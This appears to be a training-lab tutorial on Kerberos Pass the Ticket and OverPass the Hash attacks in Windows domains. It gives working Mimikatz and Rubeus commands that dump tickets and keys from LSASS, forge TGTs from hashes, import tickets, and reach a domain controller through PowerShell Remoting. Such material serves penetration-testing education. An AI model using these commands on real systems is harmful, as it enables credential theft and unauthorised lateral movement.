-----
We need a valid Kerberos ticket to perform a `Pass the Ticket (PtT)`. It can be:

- Service Ticket (TGS - Ticket Granting Service) to allow access to a particular resource.
- Ticket Granting Ticket (TGT), which we use to request service tickets to access any resource the user has privileges.

## Harvesting Kerberos Tickets from Windows
---
On Windows, tickets are processed and stored by the LSASS process. Therefore, to get a ticket from a Windows system, you must communicate with LSASS and request it. As a non-admin you can only get your ticket, but as a local administrator you can collect everything.

We can harvest all tickets from a system using the `Mimikatz` module `sekurlsa::tickets /export`. The result is a list of files with the extension `.kirbi`, which contain the tickets.

```cmd
mimikatz.exe
privilege::debug
sekurlsa::tickets /export
```

#### Rubeus - Export Tickets
---
We can also export tickets using `Rubeus` and the option `dump`. This option can be used to dump all tickets (if running as a local administrator). `Rubeus dump`, instead of giving us a file, will print the ticket encoded in base64 format. We are adding the option `/nowrap` for easier copy-paste.

```cmd
Rubeus.exe dump /nowrap
```

**Note:** To collect all tickets we need to execute Mimikatz or Rubeus as an administrator.


## Pass the Key or OverPass the Hash
---
The traditional PtH technique involves reusing an NTLM password hash that doesn't toch Kerberos. The Pass the Key or OverPass the Hash approach converts a hash/key for domain-joined users into a full TGT.

To forge our tickets, we need to have the user's hash; we can use Mimikatz to dump all users Kerberos encryption keys using the module `sekurlsa::ekeys`. This module will enumerate all key types present for the Kerberos package.

#### Mimikatz - Pass the Key or OverPass the Hash
```cmd
mimikatz.exe
privilege::debug
sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
```

This will create a new `cmd.exe` window that we can use to request access to any service we want in the context of the target user.

To forge a ticket using `Rubeus`, we can use the module `asktgt` with the username, domain, and hash which can be `/rc4`, `/aes128`, `/aes256`, or `/des`. In the following example, we use the aes256 hash from the information we collect using Mimikatz `sekurlsa::ekeys`.

#### Rubeus - Pass the Key or OverPass the Hash

```cmd
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
```

**Note:** Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus doesn't.

**Note:** Modern Windows domains (functional level 2008 and above) use AES encryption by default in normal Kerberos exchanges. If we use a rc4_hmac (NTLM) hash in a Kerberos exchange instead of an aes256_cts_hmac_sha1 (or aes128) key, it may be detected as an "encryption downgrade."


## Pass the Ticket (PtT)
---
Now we can submit the ticket (TGT or TGS) to the current logon session. We can use the `/ptt` flag for this.

```cmd
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
```

Another way is to import the ticket into the current session using the `.kirbi` file from the disk.

```cmd
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
```

We can also use the base64 output from Rubeus or convert a .kirbi to base64 to perform the Pass the Ticket attack. We can use PowerShell to convert a .kirbi to base64.

```powershell
 [Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
```

Using Rubeus, we can perform a Pass the Ticket providing the base64 string instead of the file name.

```cmd-session
Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/<SNIP>
```

Finally, we can also perform the Pass the Ticket attack using the Mimikatz module `kerberos::ptt` and the .kirbi file that contains the ticket we want to import.

```cmd
mimikatz.exe
privilege::debug
kerebros::ptt "<location .kirbi file>"
exit
```

**Note:** Instead of opening mimikatz.exe with cmd.exe and exiting to get the ticket into the current command prompt, we can use the Mimikatz module `misc` to launch a new command prompt window with the imported ticket using the `misc::cmd` command.

## Pass The Ticket with PowerShell Remoting (Windows)
----
Suppose we find a user account that doesn't have administrative privileges on a remote computer but is a member of the Remote Management Users group. In that case, we can use PowerShell Remoting to connect to that computer and execute commands.

To use PowerShell Remoting with Pass the Ticket, we can use Mimikatz to import our ticket and then open a PowerShell console and connect to the target machine.

```cmd
mimikatz.exe
privilege::debug
kerebros::ptt "<location .kirbi file>"
exit
```

```cmd
powershell
Enter_PSSession -ComputerName DC01
```

## Rubeus - PowerShell Remoting with Pass the Ticket
---
Rubeus has the option `createnetonly`, which creates a sacrificial process/logon session. The process is hidden by default, but we can specify the flag `/show` to display the process. This prevents the erasure of existing TGTs for the current logon session.

```cmd
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```

The above command will open a new cmd window. From that window, we can execute Rubeus to request a new TGT with the option `/ptt` to import the ticket into our current session and connect to the DC using PowerShell Remoting.

```cmd
Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
```

